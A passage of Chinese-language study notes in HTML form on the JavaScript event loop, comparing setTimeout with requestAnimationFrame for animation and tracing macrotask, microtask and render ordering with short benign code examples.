12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">这种现象一般有两个原因：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">1、setTimeout 的执行时间并不是确定的。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">在 JavaScript 中，setTimeout 任务被放进异步队列中，只有当主线程上的任务执行完以后，才会去检查该队列的任务是否需要开始执行。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">所以，setTimeout 的实际执行时间一般比其设定的时间晚一些。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">这种运行机制决定了时间间隔参数实际上只是指定了把动画代码添加到【浏览器 UI 线程队列】中以等待执行的时间。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">如果队列前面已经加入了其他任务，那动画代码就要等前面的任务完成后再执行</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">let startTime = performance.now();</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">setTimeout(() =&gt; {</font></div><div><font style="font-size: 12pt;">  let endTime = performance.now();</font></div><div><font style="font-size: 12pt;">  console.log(endTime - startTime);</font></div><div><font style="font-size: 12pt;">}, 50);</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">/* 一个非常耗时的任务 */</font></div><div><font style="font-size: 12pt;">for (let i = 0; i &lt; 20000; i++) {</font></div><div><font style="font-size: 12pt;">  console.log(0);</font></div><div><font style="font-size: 12pt;">}</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/1684ce0619a26535_tplv-t2oaga2asx-watermark.jpg" type="image/jpeg" data-filename="1684ce0619a26535_tplv-t2oaga2asx-watermark.jpg" width="313"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/2021-12-05_131220.jpg" type="image/jpeg" data-filename="2021-12-05_131220.jpg" width="1108"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/2021-12-05_131142.jpg" type="image/jpeg" data-filename="2021-12-05_131142.jpg" width="1102"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">2、</span><span style="font-size: 12pt; font-weight: bold;">刷新频率受屏幕分辨率和屏幕尺寸影响，不同设备的屏幕刷新率可能不同，setTimeout 只能设置固定的时间间隔，这个时间和屏幕刷新间隔可能不同。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">setTimeout 的执行只是在内存中对图像属性进行改变，这个改变必须要等到下次浏览器重绘时才会被更新到屏幕上。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">如果和屏幕刷新步调不一致，就可能导致中间某些帧的操作被跨越过去，直接更新下下一帧的图像。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">假如使用定时器设置间隔 10ms 执行一个帧，而浏览器刷新间隔是 16.6ms（即 60 FPS）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/1694cac2cf97812b_tplv-t2oaga2asx-watermark.jpg" type="image/jpeg" data-filename="1694cac2cf97812b_tplv-t2oaga2asx-watermark.jpg" width="963"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">由图可知，在 20ms 时，setTimeout调用回调函数在内存中将图像的属性进行了修改，但是此时浏览器下次刷新是在 33.2ms 的时候，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">所以 20ms 修改的图像没有更新到屏幕上。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">而到了 30ms 的时候，setTimeout又一次调用回调函数并改变了内存中图像的属性，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">之后浏览器就刷新了，20ms 更新的状态被 30ms 的图像覆盖了，屏幕上展示的是 30ms 时的图像，所以 20ms 的这一帧就丢失了。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">丢失的帧多了，画面就卡顿了。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: unset; font-family: unset;">使用 requestAnimationFrame 执行动画，最大优势是能保证回调函数在屏幕每一次刷新间隔中只被执行一次，这样就不会引起丢帧，动画也就不会卡顿。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><a href="https://juejin.cn/post/6991297852462858277" style="font-size: 12pt;">https://juejin.cn/post/6991297852462858277</a></span></div><div><br/></div><div><a href="https://juejin.cn/post/6844903761102536718" style="font-size: 12pt;">https://juejin.cn/post/6844903761102536718</a></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">我们用一个递归函数换成 rAF 来模拟 10 次颜色变化的动画。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">浏览器会非常规律的把这 10 组也就是 20 次颜色变化绘制出来。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">let i = 10</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">let req = () =&gt; {</font></div><div><font style="font-size: 12pt;">  i--</font></div><div><font style="font-size: 12pt;">  requestAnimationFrame(() =&gt; {</font></div><div><font style="font-size: 12pt;">    document.body.style.background = &quot;red&quot;</font></div><div><font style="font-size: 12pt;">    requestAnimationFrame(() =&gt; {</font></div><div><font style="font-size: 12pt;">      document.body.style.background = &quot;blue&quot;</font></div><div><font style="font-size: 12pt;">      if (i &gt; 0) {</font></div><div><font style="font-size: 12pt;">        req()</font></div><div><font style="font-size: 12pt;">      }</font></div><div><font style="font-size: 12pt;">    })</font></div><div><font style="font-size: 12pt;">  })</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">req()</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/172369395743293b_tplv-t2oaga2asx-watermark.jpg" type="image/jpeg" data-filename="172369395743293b_tplv-t2oaga2asx-watermark.jpg" width="792"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">定时器合并</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">通常，事件循环必须执行完任务，才会进行浏览器渲染。（任务 --&gt; 渲染 --&gt; 任务 --&gt; 渲染）</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">但是在这里，因为每当我们执行完一个任务（JS）后，浏览器是不能保证会重新渲染的，可能我们执行了多次任务之后，浏览器才会渲染一次。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-family: unset; font-weight: bold;">（</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-family: unset; font-weight: bold;">定时器宏任务可能会直接跳过渲染</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-family: unset; font-weight: bold;">）</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">有时候浏览器希望两次「定时器任务」是合并的，他们之间只会穿插着 microTask 的执行，而不会穿插屏幕渲染相关的流程</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">如果满足以下条件，也会跳过渲染：</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">1. 浏览器判断更新渲染不会带来视觉上的改变。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">2. </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">map of animation frame callbacks 为空，也就是帧动画回调为空，可以通过 requestAnimationFrame 来请求帧动画。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">所以，</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">在任务中不要放渲染相关的代码。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">应该放到渲染之前，requestAnimationFrame （rAF）正是这样做的。</span></div><div><br/></div><div><span style="font-size: 12pt;">定时器宏任务可能会直接跳过渲染。</span></div><div><br/></div><div><span style="font-size: 12pt;">按照一些常规的理解来说，宏任务之间理应穿插渲染，而定时器任务就是一个典型的宏任务，看一下以下的代码：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">setTimeout(() =&gt; {</span></div><div><span style="font-size: 12pt;">  console.log(&quot;sto&quot;)</span></div><div><span style="font-size: 12pt;">  requestAnimationFrame(() =&gt; console.log(&quot;rAF&quot;))</span></div><div><span style="font-size: 12pt;">})</span></div><div><br/></div><div><span style="font-size: 12pt;">setTimeout(() =&gt; {</span></div><div><span style="font-size: 12pt;">  console.log(&quot;sto&quot;)</span></div><div><span style="font-size: 12pt;">  requestAnimationFrame(() =&gt; console.log(&quot;rAF&quot;))</span></div><div><span style="font-size: 12pt;">})</span></div><div><br/></div><div><span style="font-size: 12pt;">queueMicrotask(() =&gt; console.log(&quot;mic&quot;))</span></div><div><span style="font-size: 12pt;">queueMicrotask(() =&gt; console.log(&quot;mic&quot;))</span></div></div><div><br/></div><div><span style="font-size: 12pt;">从直觉上来看，顺序是不是应该是：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">mic</span></div><div><span style="font-size: 12pt;">mic</span></div><div><span style="font-size: 12pt;">sto</span></div><div><span style="font-size: 12pt;">rAF</span></div><div><span style="font-size: 12pt;">sto</span></div><div><span style="font-size: 12pt;">rAF</span></div></div><div><br/></div><div><span style="font-size: 12pt;">也就是每一个宏任务之后都紧跟着一次渲染。</span></div><div><br/></div><div><span style="font-size: 12pt;">实际上不会，浏览器会合并这两个定时器任务：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">mic</span></div><div><span style="font-size: 12pt;">mic</span></div><div><span style="font-size: 12pt;">sto</span></div><div><span style="font-size: 12pt;">sto</span></div><div><span style="font-size: 12pt;">rAF</span></div><div><span style="font-size: 12pt;">rAF</span></div></div><div><br/></div><div><span style="font-size: 12pt;">setTimeout(callbak, 0), 就会存在这种情况，callbak 执行了多次，浏览器可能只会渲染一次。</span></div><div><br/></div><div><span style="font-size: 12pt;">在大多数情况下，我们屏幕的更新频率是 60HZ , 如果我们在 1s 内，更新样式 1000 次，浏览器不会渲染 1000 次，只会渲染 60 次。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: unset; font-family: unset; font-weight: bold;">渲染发生在每一帧的开始，包括样式计算，布局和绘制。</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">button.addEventListener('click',() =&gt; {</span></div><div><span style="font-size: 12pt;">  box.style.display = 'none';</span></div><div><span style="font-size: 12pt;">  box.style.display = 'block';</span></div><div><span style="font-size: 12pt;">  box.style.display = 'none';</span></div><div><span style="font-size: 12pt;">  box.style.display = 'block';</span></div><div><span style="font-size: 12pt;">  box.style.display = 'none';</span></div><div><span style="font-size: 12pt;">  box.style.display = 'block';</span></div><div><span style="font-size: 12pt;">  box.style.display = 'none';</span></div><div><span style="font-size: 12pt;">  box.style.display = 'block';</span></div><div><span style="font-size: 12pt;">  box.style.display = 'none';</span></div><div><span style="font-size: 12pt;">});</span></div></div><div><br/></div><div><span style="font-size: 12pt;">事件循环保证在渲染之前，Javascript 将任务执行完，所以浏览器只执行最后一行代码。</span></div><div><br/></div><div><span style="font-size: 12pt;">人们喜欢使用 setTimeout 来绘制动画，如果更加了解 requestAnimationFrame，我相信他们将选择后者</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">requestAnimationFrame(callback) 表示</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">下次页面（渲染帧）重绘前</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">调用指定的回调函数</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">当用户离开当前标签页，不会执行 </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">requestAnimationFrame(callback)，这时就需要使用 setTimeout</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">一帧的生命周期</span></div><div><br/></div><div><span style="font-size: 12pt;">渲染帧是浏览器一次完整绘制的过程</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [26].jpg" type="image/jpeg" data-filename="3.jpg" width="1035"/></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">回调函数执行次数通常是每秒 60 次，但在大多数遵循W3C建议的浏览器中，回调函数执行次数通常与浏览器屏幕刷新次数相匹配。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">浏览器会尽可能的保持帧率稳定，例如页面性能无法维持 60 fps（1000 / 60 ，每 16.66ms 渲染一次）的话，那么浏览器就会选择 30fps 的更新速率，而不是偶尔丢帧。</span></div><div><br/></div><div><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestAnimationFrame" style="font-size: 12pt;">https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestAnimationFrame</a></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3.png" type="image/png" data-filename="3.png" width="1488"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/4 [2].gif" type="image/gif" data-filename="4.gif" width="420"/></div><div><br/></div><div><span style="font-size: 12pt;">requestAnimationFrame, setTimeout 同时执行时，</span><span style="font-size: 12pt; color: unset; font-family: unset;">setTimout 执行的频率更快一些，而 rAF 则和显示刷新频率一致，有固定的执行间隔。</span></div><div><br/></div><div><span style="font-size: 12pt; color: unset; font-family: unset;">(这是其他大佬通过实验得来的，测试不准，可能是因为电脑每秒的刷新频率不足60帧)</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">为什么 setTimeout 会更快？</span></div><div><br/></div><div><span style="font-size: 12pt;">因为 callback 执行的次数要比 rAF 多，rAF 只会在渲染之前执行回调。</span></div><div><br/></div><div><span style="font-size: 12pt;">setTimout 可能会出现漂移，比如这一帧内不执行callback，下一帧内执行两次callback。所以 setTimout 并不适合用来做动画。</span></div><div><br/></div><div><span style="font-size: 12pt;">使用 rAF，callback 只会在每一帧渲染前执行 callback。</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">一个例子</span></div><div><br/></div><div><span style="font-size: 12pt;">白色 box，先运动到1000px，然后再运动到500px。</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [27].jpg" type="image/jpeg" data-filename="3.jpg" width="1280"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [28].jpg" type="image/jpeg" data-filename="3.jpg" width="1280"/></div><div><br/></div><div><span style="font-size: 12pt;">事件循环的顺序为：</span><span style="font-size: 12pt;">任务（运动到1000px） -&gt; RAF（运动到500px）-&gt; 浏览器渲染</span></div><div><br/></div><div><span style="font-size: 12pt;">在 Chrome80 的版本上，需要改成以下代码才可正常运行：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">btn.addEventListener('click', () =&gt; {</span></div><div><span style="font-size: 12pt;">    box.style.transform = 'translateX(500px)'</span></div><div><span style="font-size: 12pt;">    requestAnimationFrame(() =&gt; {</span></div><div><span style="font-size: 12pt;">        requestAnimationFrame(() =&gt; {</span></div><div><span style="font-size: 12pt;">            box.style.transition = 'transform 1s ease-out'</span></div><div><span style="font-size: 12pt;">            box.style.transform = 'translateX(250px)'</span></div><div><span style="font-size: 12pt;">        })</span></div><div><span style="font-size: 12pt;">    })</span></div><div><span style="font-size: 12pt;">})</span></div></div><div><br/></div><div><span style="font-size: 12pt;">事件循环的顺序变成：任务（运动到1000px） -&gt; 第一层RAF -&gt; 浏览器渲染 -&gt; 第二层RAF（运动到500px）-&gt; 浏览器渲染</span></div><div><br/></div><div><span style="font-size: 12pt;">除了再嵌套一层RAF，有没有其他方法呢？我们可以使用 getBoundingClientRect, clientWidth 等 API 强制浏览器重排。</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">const btn = document.getElementById('btn')</span></div><div><span style="font-size: 12pt;">const box = document.getElementById('box')</span></div><div><span style="font-size: 12pt;">btn.addEventListener('click', () =&gt; {</span></div><div><span style="font-size: 12pt;">    box.style.transform = 'translateX(500px)'</span></div><div><span style="font-size: 12pt;">    box.clientWidth</span></div><div><span style="font-size: 12pt;">    box.style.transition = 'transform 1s ease-out'</span></div><div><span style="font-size: 12pt;">    box.style.transform = 'translateX(250px)'</span></div><div><span style="font-size: 12pt;">})</span></div></div><div><br/></div><div><span style="font-size: 12pt;">requestAnimationFrame 和 宏任务以及微任务是没有关系，requestAnimationFrame 的 callback 何时执行，只和浏览器何时刷新（刷新前）执行。</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">DOM 操作</span><span style="font-size: 12pt; font-weight: bold;">阻塞事件循环</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [29].jpg" type="image/jpeg" data-filename="3.jpg" width="1280"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [30].jpg" type="image/jpeg" data-filename="3.jpg" width="1280"/></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">白方块可以看作执行代码的主线程。</span></div><div><br/></div><div><span style="font-size: 12pt;">事件循环永远无法绕到浏览器渲染的那个弯道上。事件循环也无法处理新添加的任务。所以浏览器会变得无响应。</span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">setTimeout 会不会阻塞事件循环？</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [31].jpg" type="image/jpeg" data-filename="3.jpg" width="1280"/></div><div><br/></div><div><span style="font-size: 12pt;">答案是不会，setTimeout添加一个任务后，事件循环执行完该任务后，</span><span style="font-size: 12pt;">有时间去处理浏览器的渲染，而</span><span style="font-size: 12pt;">任务不会永远无法结束，</span><span style="font-size: 12pt;">会再添加一个任务。</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [3].gif" type="image/gif" data-filename="3.gif" width="419"/></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">无限循环的微任务</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Microtasks 到底会在什么时候执行，正确的说法应该是 JS 调用栈为空时执行。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">处理微任务时，</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">如果</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">有新的微任务被添加，并且加入的速度大于执行的速度，那么就会永远执行微任务，</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">浏览器就会被卡住</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">。</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [32].jpg" type="image/jpeg" data-filename="3.jpg" width="1280"/></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">一个例子</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [33].jpg" type="image/jpeg" data-filename="3.jpg" width="1280"/></div><div><br/></div><div><span style="font-size: 12pt;">当我们用鼠标</span><span style="font-size: 12pt;">点击 </span><span style="font-size: 12pt;">button 的时候，</span><span style="font-size: 12pt; color: unset; font-family: unset;">结果为：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">Listener 1 -&gt; Microtask 1 -&gt; Listener 2 -&gt; Microtask 2</span></div></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [34].jpg" type="image/jpeg" data-filename="3.jpg" width="1280"/></div><div><br/></div><div><span style="font-size: 12pt;">当我们用代码点击 button 的时候</span><span style="font-size: 12pt;">，</span><span style="font-size: 12pt; color: unset; font-family: unset;">结果为：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">Listener 1 -&gt; Listener 2 -&gt; Microtask 1 -&gt; Microtask 2</span></div></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">为什么？</span></div><div><br/></div><div><span style="font-size: 12pt;">因为人为合成（synthetic）的事件派发（dispatch）是同步执行的，包括执行 click() 和 dispatchEvent() 这两种方式。</span></div><div><br/></div><div><span style="font-size: 12pt;">只有浏览器自己触发的事件才放在一个 task 里执行。</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;"># 第一步</span></div><div><span style="font-size: 12pt;"># 第一个回调执行</span></div><div><span style="font-size: 12pt;">JS stack: callback1（执行中）</span></div><div><span style="font-size: 12pt;">Microtasks: 空</span></div><div><span style="font-size: 12pt;">log: 空</span></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt;"># 第二步</span></div><div><span style="font-size: 12pt;"># 第一个回调执行完成，并退出 JS stack，JS stack 为空，此时开始清空微任务队列</span></div><div><span style="font-size: 12pt;">JS stack: 空</span></div><div><span style="font-size: 12pt;">Microtasks: Microtask 1</span></div><div><span style="font-size: 12pt;">log: Listener 1</span></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt;"># 第三步</span></div><div><span style="font-size: 12pt;">JS stack: callback2（执行中）</span></div><div><span style="font-size: 12pt;">Microtasks: 空</span></div><div><span style="font-size: 12pt;">log: 空</span></div><div><br/></div><div><span style="font-size: 12pt;"># 第四步</span></div><div><span style="font-size: 12pt;"># 第二个回调执行完成，并退出 JS stack，JS stack 为空，此时开始清空微任务队列</span></div><div><span style="font-size: 12pt;">JS stack: 空</span></div><div><span style="font-size: 12pt;">Microtasks: Microtask 2</span></div><div><span style="font-size: 12pt;">log: Listener 2</span></div><div><span style="font-size: 12pt;">………………</span></div></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;"># 第一步</span></div><div><span style="font-size: 12pt;"># 使用JS调用点击事件，JS stack会多出一个Script</span></div><div><span style="font-size: 12pt;">JS stack: Script</span></div><div><span style="font-size: 12pt;">Microtasks: 空</span></div><div><span style="font-size: 12pt;">log: 空</span></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt;"># 第二步</span></div><div><span style="font-size: 12pt;"># callback1 开始执行</span></div><div><span style="font-size: 12pt;">JS stack: callback1（执行中）， Script</span></div><div><span style="font-size: 12pt;">Microtasks:</span></div><div><span style="font-size: 12pt;">log:</span></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt;"># 第三步</span></div><div><span style="font-size: 12pt;"># callback1 执行完成，退出堆栈</span></div><div><span style="font-size: 12pt;"># 但是JS堆栈中，还有 Script，所以还不能执行微任务</span></div><div><span style="font-size: 12pt;">JS stack: Script</span></div><div><span style="font-size: 12pt;">Microtasks: Microtask 1</span></div><div><span style="font-size: 12pt;">log: Listener 1</span></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt;"># 第四步</span></div><div><span style="font-size: 12pt;"># 此时 callback2 执行</span></div><div><span style="font-size: 12pt;">JS stack: callback2（执行中），Script</span></div><div><font style="font-size: 12pt;">Microtasks: Microtask 1 ，Microtask 2</font></div><div><span style="font-size: 12pt;">log: Listener 1 ，Listener 2</span></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt;"># 第五步</span></div><div><span style="font-size: 12pt;"># Listener 2 执行完成退出，</span></div><div><span style="font-size: 12pt;">JS stack: Script</span></div><div><font style="font-size: 12pt;">Microtasks: Microtask 1 ，Microtask 2</font></div><div><span style="font-size: 12pt;">log: Listener 1 ，Listener 2</span></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt;"># 第六步</span></div><div><span style="font-size: 12pt;"># Script 执行完成退出，准备开始清空微任务队列</span></div><div><span style="font-size: 12pt;">JS stack: 空</span></div><div><font style="font-size: 12pt;">Microtasks: Microtask 1 ，Microtask 2</font></div><div><span style="font-size: 12pt;">log: Listener 1 ，Listener 2</span></div><div><br/></div><div><br/></div><div><span style="font-size: 12pt;"># 第七步</span></div><div><span style="font-size: 12pt;"># 开始清空微任务队列</span></div><div><span style="font-size: 12pt;">JS stack: 空</span></div><div><span style="font-size: 12pt;">Microtasks: 空</span></div><div><span style="font-size: 12pt;">log: Listener 1 ，Listener 2，Microtask 1，Microtask 2</span></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [35].jpg" type="image/jpeg" data-filename="3.jpg" width="585"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">也就是：</span></span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">当你往外拿回调函数的时候，先从微任务的队列里拿回调函数，然后再从宏任务的队列上拿回调函数。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">其实关键点在于宏任务和微任务的处理方式：宏任务是每次事件循环只处理一个，而微任务是批量一次性处理完，微任务的处理时机是在每个宏任务之间的间隔中</span></span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">（同步宏 - 异步微 - 异步宏 - 异步微 - 异步宏 </span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">- 异步微 - 异步宏</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">）</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [36].jpg" type="image/jpeg" data-filename="3.jpg" width="1051"/></div><div><br/></div><div><span style="font-size: 12pt;">解释一下上图的过程，</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">当主线程执行完同步任务后：</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">1. 